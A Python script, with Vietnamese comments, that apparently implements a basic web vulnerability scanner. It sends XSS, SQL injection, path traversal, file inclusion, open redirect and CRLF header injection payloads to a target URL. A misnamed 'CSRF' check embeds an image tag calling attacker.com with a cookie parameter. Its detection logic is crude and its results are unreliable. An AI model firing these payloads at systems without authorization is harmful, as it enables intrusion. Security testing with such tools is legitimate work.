import requests
from bs4 import BeautifulSoup
import re
import json
import time
import ssl

class WebVulnerabilityScanner:
    def __init__(self, target_url, proxies=None, mode="comprehensive"):
        self.target_url = target_url
        self.found_vulnerabilities = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.proxies = proxies if proxies else {}
        self.mode = mode

    # Quét XSS
    def scan_xss(self):
        if self.mode == "quick":
            xss_payloads = ["<script>alert('XSS')</script>"]
        else:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

        for payload in xss_payloads:
            url = f"{self.target_url}?search={payload}"
            response = requests.get(url, headers=self.headers, proxies=self.proxies)
            if payload in response.text:
                self.found_vulnerabilities.append(f"XSS Vulnerability found with payload: {payload}")

    # Quét SQL Injection
    def scan_sql_injection(self):
        if self.mode == "quick":
            sql_payloads = ["' OR 1=1 --"]
        else:
            sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR "1"="1']

        for payload in sql_payloads:
            url = f"{self.target_url}?id={payload}"
            response = requests.get(url, headers=self.headers, proxies=self.proxies)
            if "SQL syntax" in response.text or "error" in response.text.lower():
                self.found_vulnerabilities.append(f"SQL Injection Vulnerability found with payload: {payload}")

    # Quét Directory Traversal
    def scan_directory_traversal(self):
        traversal_payloads = ["../../../../etc/passwd", "../windows/system32/cmd.exe"]
        for payload in traversal_payloads:
            url = f"{self.target_url}/{payload}"
            response = requests.get(url, headers=self.headers, proxies=self.proxies)
            if "root:x:" in response.text or "CMD.EXE" in response.text:
                self.found_vulnerabilities.append(f"Directory Traversal Vulnerability found with payload: {payload}")

    # Quét File Inclusion
    def scan_file_inclusion(self):
        file_inclusion_payloads = ["php://input", "file:///etc/passwd"]
        for payload in file_inclusion_payloads:
            url = f"{self.target_url}?file={payload}"
            response = requests.get(url, headers=self.headers, proxies=self.proxies)
            if "root:x:" in response.text:
                self.found_vulnerabilities.append(f"File Inclusion Vulnerability found with payload: {payload}")

    # Quét Open Redirect
    def scan_open_redirect(self):
        redirect_payloads = ["https://attacker.com"]
        for payload in redirect_payloads:
            url = f"{self.target_url}?redirect={payload}"
            response = requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if "location" in response.headers and payload in response.headers["location"]:
                self.found_vulnerabilities.append(f"Open Redirect Vulnerability found with payload: {payload}")

    # Quét CSRF
    def scan_csrf(self):
        csrf_payload = "<img src='http://attacker.com/csrf?cookie=" + requests.utils.quote(self.target_url) + "'>"
        url = f"{self.target_url}?data={csrf_payload}"
        response = requests.get(url, headers=self.headers, proxies=self.proxies)
        if "success" in response.text.lower():
            self.found_vulnerabilities.append("Possible CSRF Vulnerability detected")

    # Quét Header Injection
    def scan_header_injection(self):
        header_payloads = ["%0d%0aSet-Cookie:csrf-token=malicious"]
        for payload in header_payloads:
            headers = self.headers.copy()
            headers["X-Forwarded-For"] = payload
            response = requests.get(self.target_url, headers=headers, proxies=self.proxies)
            if "Set-Cookie" in response.headers:
                self.found_vulnerabilities.append(f"Header Injection Vulnerability found with payload: {payload}")

    # Báo cáo kết quả
    def report(self, output_format="text"):
        if output_format == "json":
            with open("vulnerability_report.json", "w") as report_file:
                json.dump(self.found_vulnerabilities, report_file, indent=4)
            print("Report saved as vulnerability_report.json")
        elif output_format == "html":
            with open("vulnerability_report.html", "w") as report_file:
                report_file.write("<html><body><h1>Vulnerability Report</h1><ul>")
                for vulnerability in self.found_vulnerabilities:
                    report_file.write(f"<li>{vulnerability}</li>")
                report_file.write("</ul></body></html>")
            print("Report saved as vulnerability_report.html")
        else:
            if self.found_vulnerabilities:
                print("Vulnerabilities found:")
                for vulnerability in self.found_vulnerabilities:
                    print(f"- {vulnerability}")
            else:
                print("No vulnerabilities found.")

if __name__ == "__main__":
    target = input("Enter the target URL: ")
    mode = input("Enter scan mode (quick/comprehensive): ").strip().lower()
    proxies_input = input("Enter proxy (optional, leave blank if none): ")
    proxies = {"http": proxies_input, "https": proxies_input} if proxies_input else None
    
    scanner = WebVulnerabilityScanner(target, proxies=proxies, mode=mode)
    
    start_time = time.time()

    print("Scanning for vulnerabilities...")
    scanner.scan_xss()
    scanner.scan_sql_injection()
    scanner.scan_directory_traversal()
    scanner.scan_file_inclusion()
    scanner.scan_open_redirect()
    scanner.scan_csrf()
    scanner.scan_header_injection()

    # Report
    output_format = input("Enter output format (text, json, html): ")
    scanner.report(output_format)

    elapsed_time = time.time() - start_time
    print(f"Scan completed in {elapsed_time:.2f} seconds")